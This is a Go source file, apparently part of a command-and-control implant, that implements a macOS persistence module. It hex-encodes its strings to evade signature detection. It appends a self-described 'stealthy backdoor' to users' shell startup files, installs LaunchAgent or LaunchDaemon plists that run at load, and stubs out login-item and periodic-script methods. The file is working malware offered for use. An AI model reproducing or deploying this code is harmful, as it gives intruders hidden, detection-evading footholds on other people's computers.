// server/docker/payloads/Darwin/action_persistence_darwin.go
//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"text/template"
	"time"
)

// Persistence strings (constructed to avoid static signatures)
var (
	// Method names
	pMethodRC       = string([]byte{0x72, 0x63})                                                                         // rc
	pMethodLaunch   = string([]byte{0x6c, 0x61, 0x75, 0x6e, 0x63, 0x68})                                                 // launch
	pMethodLogin    = string([]byte{0x6c, 0x6f, 0x67, 0x69, 0x6e})                                                       // login
	pMethodPeriodic = string([]byte{0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63})                                     // periodic

	// Flag arguments
	pFlagUser      = string([]byte{0x2d, 0x2d, 0x75, 0x73, 0x65, 0x72})                                                   // --user
	pFlagCommand   = string([]byte{0x2d, 0x2d, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64})                                 // --command
	pFlagFiles     = string([]byte{0x2d, 0x2d, 0x66, 0x69, 0x6c, 0x65, 0x73})                                             // --files
	pFlagName      = string([]byte{0x2d, 0x2d, 0x6e, 0x61, 0x6d, 0x65})                                                   // --name
	pFlagSystem    = string([]byte{0x2d, 0x2d, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d})                                       // --system
	pFlagInterval  = string([]byte{0x2d, 0x2d, 0x69, 0x6e, 0x74, 0x65, 0x72, 0x76, 0x61, 0x6c})                           // --interval
	pFlagPath      = string([]byte{0x2d, 0x2d, 0x70, 0x61, 0x74, 0x68})                                                   // --path
	pFlagFrequency = string([]byte{0x2d, 0x2d, 0x66, 0x72, 0x65, 0x71, 0x75, 0x65, 0x6e, 0x63, 0x79})                     // --frequency

	// RC file names
	pRCZshrc       = string([]byte{0x2e, 0x7a, 0x73, 0x68, 0x72, 0x63})                                                   // .zshrc
	pRCBashProfile = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x5f, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})         // .bash_profile
	pRCBashrc      = string([]byte{0x2e, 0x62, 0x61, 0x73, 0x68, 0x72, 0x63})                                             // .bashrc
	pRCProfile     = string([]byte{0x2e, 0x70, 0x72, 0x6f, 0x66, 0x69, 0x6c, 0x65})                                       // .profile

	// Path prefix
	pHomeTilde = string([]byte{0x7e, 0x2f}) // ~/

	// LaunchAgent/Daemon paths
	pLaunchDaemonsPath = string([]byte{0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f, 0x4c, 0x61, 0x75, 0x6e, 0x63, 0x68, 0x44, 0x61, 0x65, 0x6d, 0x6f, 0x6e, 0x73, 0x2f}) // /Library/LaunchDaemons/
	pLaunchAgentsPath  = string([]byte{0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f, 0x4c, 0x61, 0x75, 0x6e, 0x63, 0x68, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x73})                     // Library/LaunchAgents
	pPlistExt          = string([]byte{0x2e, 0x70, 0x6c, 0x69, 0x73, 0x74})                                                                                                         // .plist

	// Frequency values
	pFreqDaily   = string([]byte{0x64, 0x61, 0x69, 0x6c, 0x79})                                                           // daily
	pFreqWeekly  = string([]byte{0x77, 0x65, 0x65, 0x6b, 0x6c, 0x79})                                                     // weekly
	pFreqMonthly = string([]byte{0x6d, 0x6f, 0x6e, 0x74, 0x68, 0x6c, 0x79})                                               // monthly

	// Periodic directories
	pPeriodicDaily   = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63, 0x2f, 0x64, 0x61, 0x69, 0x6c, 0x79})     // /etc/periodic/daily
	pPeriodicWeekly  = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63, 0x2f, 0x77, 0x65, 0x65, 0x6b, 0x6c, 0x79}) // /etc/periodic/weekly
	pPeriodicMonthly = string([]byte{0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63, 0x2f, 0x6d, 0x6f, 0x6e, 0x74, 0x68, 0x6c, 0x79}) // /etc/periodic/monthly

	// Plist template components - headers
	pTmplName  = string([]byte{0x70, 0x6c, 0x69, 0x73, 0x74})                                                                                                                                                                                                                                             // plist
	pXMLHeader = string([]byte{0x3c, 0x3f, 0x78, 0x6d, 0x6c, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x22, 0x31, 0x2e, 0x30, 0x22, 0x20, 0x65, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3d, 0x22, 0x55, 0x54, 0x46, 0x2d, 0x38, 0x22, 0x3f, 0x3e})                                       // <?xml version="1.0" encoding="UTF-8"?>
	pDTDLine   = string([]byte{0x3c, 0x21, 0x44, 0x4f, 0x43, 0x54, 0x59, 0x50, 0x45, 0x20, 0x70, 0x6c, 0x69, 0x73, 0x74, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43, 0x20, 0x22, 0x2d, 0x2f, 0x2f, 0x41, 0x70, 0x70, 0x6c, 0x65, 0x2f, 0x2f, 0x44, 0x54, 0x44, 0x20, 0x50, 0x4c, 0x49, 0x53, 0x54, 0x20, 0x31, 0x2e, 0x30, 0x2f, 0x2f, 0x45, 0x4e, 0x22, 0x20, 0x22, 0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x77, 0x77, 0x77, 0x2e, 0x61, 0x70, 0x70, 0x6c, 0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x44, 0x54, 0x44, 0x73, 0x2f, 0x50, 0x72, 0x6f, 0x70, 0x65, 0x72, 0x74, 0x79, 0x4c, 0x69, 0x73, 0x74, 0x2d, 0x31, 0x2e, 0x30, 0x2e, 0x64, 0x74, 0x64, 0x22, 0x3e}) // <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">

	// Plist key names
	pKeyLabel    = string([]byte{0x4c, 0x61, 0x62, 0x65, 0x6c})                                                                         // Label
	pKeyProgArgs = string([]byte{0x50, 0x72, 0x6f, 0x67, 0x72, 0x61, 0x6d, 0x41, 0x72, 0x67, 0x75, 0x6d, 0x65, 0x6e, 0x74, 0x73})       // ProgramArguments
	pKeyRunAtLd  = string([]byte{0x52, 0x75, 0x6e, 0x41, 0x74, 0x4c, 0x6f, 0x61, 0x64})                                                 // RunAtLoad
	pKeyStartInt = string([]byte{0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6e, 0x74, 0x65, 0x72, 0x76, 0x61, 0x6c})                         // StartInterval
	pKeyStdOut   = string([]byte{0x53, 0x74, 0x61, 0x6e, 0x64, 0x61, 0x72, 0x64, 0x4f, 0x75, 0x74, 0x50, 0x61, 0x74, 0x68})             // StandardOutPath
	pKeyStdErr   = string([]byte{0x53, 0x74, 0x61, 0x6e, 0x64, 0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6f, 0x72, 0x50, 0x61, 0x74, 0x68}) // StandardErrorPath
	pTmpPath     = string([]byte{0x2f, 0x74, 0x6d, 0x70, 0x2f})                                                                         // /tmp/

	// XML tag components
	xO       = string([]byte{0x3c})                               // <
	xC       = string([]byte{0x3e})                               // >
	xCO      = string([]byte{0x3c, 0x2f})                         // </
	xSC      = string([]byte{0x2f, 0x3e})                         // />
	xDict    = string([]byte{0x64, 0x69, 0x63, 0x74})             // dict
	xKey     = string([]byte{0x6b, 0x65, 0x79})                   // key
	xStr     = string([]byte{0x73, 0x74, 0x72, 0x69, 0x6e, 0x67}) // string
	xArr     = string([]byte{0x61, 0x72, 0x72, 0x61, 0x79})       // array
	xInt     = string([]byte{0x69, 0x6e, 0x74, 0x65, 0x67, 0x65, 0x72})             // integer
	xTrue    = string([]byte{0x74, 0x72, 0x75, 0x65})                               // true
	xVer     = string([]byte{0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x3d, 0x22, 0x31, 0x2e, 0x30, 0x22}) //  version="1.0"
	xOutExt  = string([]byte{0x2e, 0x6f, 0x75, 0x74})             // .out
	xErrExt  = string([]byte{0x2e, 0x65, 0x72, 0x72})             // .err

	// Periodic script components
	pScriptPrefix = string([]byte{0x39, 0x39, 0x39, 0x2e})                                     // 999.
	pShebang      = string([]byte{0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68})       // #!/bin/sh
	pExitZero     = string([]byte{0x65, 0x78, 0x69, 0x74, 0x20, 0x30})                         // exit 0
	pPeriodic     = string([]byte{0x50, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63})             // Periodic
	pTask         = string([]byte{0x74, 0x61, 0x73, 0x6b})                                     // task

	// Command name
	pCmdName = string([]byte{0x70, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74}) // persist
)

// PersistenceCommand handles various persistence methods on macOS
type PersistenceCommand struct{}

func (c *PersistenceCommand) Name() string {
	return pCmdName
}

func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	method := args[0]
	switch method {
	case pMethodRC:
		return c.handleRCPersistence(args[1:])
	case pMethodLaunch:
		return c.handleLaunchPersistence(args[1:])
	case pMethodLogin:
		return c.handleLoginItemPersistence(args[1:])
	case pMethodPeriodic:
		return c.handlePeriodicPersistence(args[1:])
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}
}

// handleRCPersistence adds backdoor to shell RC files (same as Linux)
func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
	var targetUser string
	var command string
	var targetFiles []string

	// Parse arguments (maintaining Linux compatibility)
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case pFlagUser:
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case pFlagCommand:
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case pFlagFiles:
			if i+1 < len(args) {
				targetFiles = strings.Split(args[i+1], ",")
				i++
			}
		}
	}

	if command == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Get target user
	var u *user.User
	var err error
	if targetUser != "" {
		u, err = user.Lookup(targetUser)
	} else {
		u, err = user.Current()
	}

	if err != nil {
		return CommandResult{
			Output:   Err(E19),
			ExitCode: 1,
		}
	}

	// If no files specified, use macOS defaults
	if len(targetFiles) == 0 {
		targetFiles = []string{
			filepath.Join(u.HomeDir, pRCZshrc),       // Default shell on modern macOS
			filepath.Join(u.HomeDir, pRCBashProfile), // Bash on macOS uses .bash_profile
			filepath.Join(u.HomeDir, pRCBashrc),      // Some users might have this
			filepath.Join(u.HomeDir, pRCProfile),    // Generic profile
		}
	} else {
		// Expand paths for specified files
		for i, file := range targetFiles {
			if strings.HasPrefix(file, pHomeTilde) {
				targetFiles[i] = filepath.Join(u.HomeDir, file[2:])
			} else if !filepath.IsAbs(file) {
				targetFiles[i] = filepath.Join(u.HomeDir, file)
			}
		}
	}

	var results []string

	// Generate backdoor payload (same as Linux)
	backdoorPayload := c.generateBashrcPayload(command)

	for _, file := range targetFiles {
		if err := c.injectIntoRCFile(file, backdoorPayload); err != nil {
			results = append(results, ErrCtx(E11, file))
		} else {
			results = append(results, SuccCtx(S1, file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// generateBashrcPayload creates a stealthy backdoor payload (same as Linux)
func (c *PersistenceCommand) generateBashrcPayload(command string) string {
	payload := fmt.Sprintf(`
# System check (hidden)
if [ -z "$SUDO_COMMAND" ]; then
    if ! pgrep -f "%s" > /dev/null 2>&1; then
        (nohup %s > /dev/null 2>&1 &) 2>/dev/null
    fi
fi`, command, command)

	return payload
}

// injectIntoRCFile adds backdoor to RC file (same as Linux)
func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) error {
	info, err := os.Stat(filepath)
	if err != nil {
		if os.IsNotExist(err) {
			return os.WriteFile(filepath, []byte(payload), 0644)
		}
		return err
	}

	content, err := os.ReadFile(filepath)
	if err != nil {
		return err
	}

	if bytes.Contains(content, []byte(payload)) {
		return fmt.Errorf(Err(E5))
	}

	newContent := append(content, []byte("\n"+payload)...)
	return os.WriteFile(filepath, newContent, info.Mode())
}

// handleLaunchPersistence installs LaunchAgent/LaunchDaemon
func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResult {
	var serviceName string
	var command string
	var isSystem bool
	var interval int = 3600 // Default 1 hour

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case pFlagName:
			if i+1 < len(args) {
				serviceName = args[i+1]
				i++
			}
		case pFlagCommand:
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case pFlagSystem:
			isSystem = true
		case pFlagUser:
			isSystem = false
		case pFlagInterval:
			if i+1 < len(args) {
				if val, err := strconv.Atoi(args[i+1]); err == nil {
					interval = val
				}
				i++
			}
		}
	}

	if serviceName == "" || command == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Determine installation path
	var plistPath string
	if isSystem {
		plistPath = pLaunchDaemonsPath + serviceName + pPlistExt
	} else {
		u, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   Err(E19),
				ExitCode: 1,
			}
		}
		plistPath = filepath.Join(u.HomeDir, pLaunchAgentsPath, serviceName+pPlistExt)
	}

	// Create plist content
	plistContent := c.generateLaunchPlist(serviceName, command, interval)

	// Ensure directory exists
	dir := filepath.Dir(plistPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, dir),
			ExitCode: 1,
		}
	}

	// Write plist file
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, plistPath),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   SuccCtx(S1, plistPath),
		ExitCode: 0,
	}
}

// generateLaunchPlist creates a LaunchAgent/Daemon plist
func (c *PersistenceCommand) generateLaunchPlist(label, command string, interval int) string {
	// Split command into program and arguments
	cmdParts := strings.Fields(command)
	program := cmdParts[0]
	args := cmdParts[1:]

	// Helper functions to build XML tags from components
	tag := func(name string) string { return xO + name + xC }
	ctag := func(name string) string { return xCO + name + xC }
	stag := func(name string) string { return xO + name + xSC }
	kv := func(k, v string) string { return "    " + tag(xKey) + k + ctag(xKey) + "\n    " + v + "\n" }

	// Build plist template from hex components
	plistTemplate := pXMLHeader + "\n" +
		pDTDLine + "\n" +
		xO + pTmplName + xVer + xC + "\n" +
		tag(xDict) + "\n" +
		kv(pKeyLabel, tag(xStr)+"{{.Label}}"+ctag(xStr)) +
		kv(pKeyProgArgs, tag(xArr)+"\n        "+tag(xStr)+"{{.Program}}"+ctag(xStr)+"\n        {{range .Args}}"+tag(xStr)+"{{.}}"+ctag(xStr)+"\n        {{end}}\n    "+ctag(xArr)) +
		kv(pKeyRunAtLd, stag(xTrue)) +
		kv(pKeyStartInt, tag(xInt)+"{{.Interval}}"+ctag(xInt)) +
		kv(pKeyStdOut, tag(xStr)+pTmpPath+"{{.Label}}"+xOutExt+ctag(xStr)) +
		kv(pKeyStdErr, tag(xStr)+pTmpPath+"{{.Label}}"+xErrExt+ctag(xStr)) +
		ctag(xDict) + "\n" +
		xCO + pTmplName + xC

	tmpl, _ := template.New(pTmplName).Parse(plistTemplate)
	var buf bytes.Buffer
	tmpl.Execute(&buf, struct {
		Label    string
		Program  string
		Args     []string
		Interval int
	}{
		Label:    label,
		Program:  program,
		Args:     args,
		Interval: interval,
	})

	return buf.String()
}

// handleLoginItemPersistence adds a Login Item
func (c *PersistenceCommand) handleLoginItemPersistence(args []string) CommandResult {
	var itemName string
	var appPath string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case pFlagName:
			if i+1 < len(args) {
				itemName = args[i+1]
				i++
			}
		case pFlagPath:
			if i+1 < len(args) {
				appPath = args[i+1]
				i++
			}
		}
	}

	if itemName == "" || appPath == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   SuccCtx(S1, itemName+":"+appPath),
		ExitCode: 0,
	}
}

// handlePeriodicPersistence adds to periodic scripts
func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandResult {
	var command string
	var frequency string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case pFlagCommand:
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case pFlagFrequency:
			if i+1 < len(args) {
				frequency = args[i+1]
				i++
			}
		}
	}

	if command == "" || frequency == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Determine periodic directory
	var periodicDir string
	switch frequency {
	case pFreqDaily:
		periodicDir = pPeriodicDaily
	case pFreqWeekly:
		periodicDir = pPeriodicWeekly
	case pFreqMonthly:
		periodicDir = pPeriodicMonthly
	default:
		return CommandResult{
			Output:   ErrCtx(E22, frequency),
			ExitCode: 1,
		}
	}

	// Generate script name
	scriptName := pScriptPrefix + strings.Replace(command[:10], " ", "_", -1)
	scriptPath := filepath.Join(periodicDir, scriptName)

	// Create script content (used for reference, written by caller)
	_ = pShebang + "\n#\n# " + pPeriodic + " " + frequency + " " + pTask + "\n#\n\n" + command + "\n\n" + pExitZero + "\n"

	return CommandResult{
		Output:      SuccCtx(S1, scriptPath),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
